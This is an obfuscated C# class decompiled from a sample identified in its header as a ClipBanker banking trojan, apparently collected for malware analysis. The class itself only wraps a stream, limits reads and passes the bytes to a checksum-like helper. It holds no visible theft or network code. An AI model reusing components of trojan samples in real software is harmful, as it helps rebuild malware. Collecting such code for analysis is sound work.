// Decompiled with JetBrains decompiler
// Type: 312.9c4
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u003312;
using Q8f;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace \u003312
{
  internal sealed class \u0039c4 : Stream, IDisposable
  {
    private static readonly long i4l = -99;
    private readonly Stream IfE;
    private readonly ov2 Id6;
    private readonly long \u003155 = -99;
    private bool \u00312P;

    public \u0039c4([In] Stream obj0)
      : this(true, \u0039c4.i4l, obj0, (ov2) null)
    {
    }

    public \u0039c4([In] Stream obj0, [In] bool obj1)
      : this(obj1, \u0039c4.i4l, obj0, (ov2) null)
    {
    }

    public \u0039c4([In] Stream obj0, [In] long obj1)
      : this(true, obj1, obj0, (ov2) null)
    {
      if (obj1 < 0L)
        throw new ArgumentException("length");
    }

    private \u0039c4([In] bool obj0, [In] long obj1, [In] Stream obj2, [In] ov2 obj3)
    {
      this.IfE = obj2 != null ? obj2 : throw new ArgumentNullException("stream");
      this.Id6 = obj3 ?? new ov2();
      this.\u003155 = obj1;
      this.\u00312P = obj0;
    }

    [SpecialName]
    public long cpa() => this.Id6.Vth;

    [SpecialName]
    public int \u0036cy() => this.Id6.\u0033D4;

    int Stream.\u003569([In] byte[] obj0, [In] int obj1, [In] int obj2)
    {
      int count = obj2;
      if (this.\u003155 != \u0039c4.i4l)
      {
        if (this.Id6.Vth >= this.\u003155)
          return 0;
        long num = this.\u003155 - this.Id6.Vth;
        if (num < (long) obj2)
          count = (int) num;
      }
      int num1 = this.IfE.Read(obj0, obj1, count);
      if (num1 > 0)
        this.Id6.x74(obj0, obj1, num1);
      return num1;
    }

    void Stream.\u003555([In] byte[] obj0, [In] int obj1, [In] int obj2)
    {
      if (obj2 > 0)
        this.Id6.x74(obj0, obj1, obj2);
      this.IfE.Write(obj0, obj1, obj2);
    }

    [SpecialName]
    bool Stream.FNC() => this.IfE.CanRead;

    [SpecialName]
    bool Stream.BC4() => false;

    [SpecialName]
    bool Stream.\u0035a6() => this.IfE.CanWrite;

    void Stream.\u0035O9() => this.IfE.Flush();

    [SpecialName]
    long Stream.\u0038xW() => this.\u003155 == \u0039c4.i4l ? this.IfE.Length : this.\u003155;

    [SpecialName]
    long Stream.l81() => this.Id6.Vth;

    [SpecialName]
    void Stream.qj2([In] long obj0) => throw new NotSupportedException();

    long Stream.\u0034y2([In] long obj0, [In] SeekOrigin obj1) => throw new NotSupportedException();

    void Stream.eM4([In] long obj0) => throw new NotSupportedException();

    void IDisposable.\u0023wjg() => this.Wu8();

    private void Wu8()
    {
      if (this.\u00312P)
        return;
      this.IfE.Close();
    }

    void Stream.x92()
    {
      // ISSUE: explicit non-virtual call
      __nonvirtual (((Stream) this).Close());
      this.Wu8();
    }
  }
}
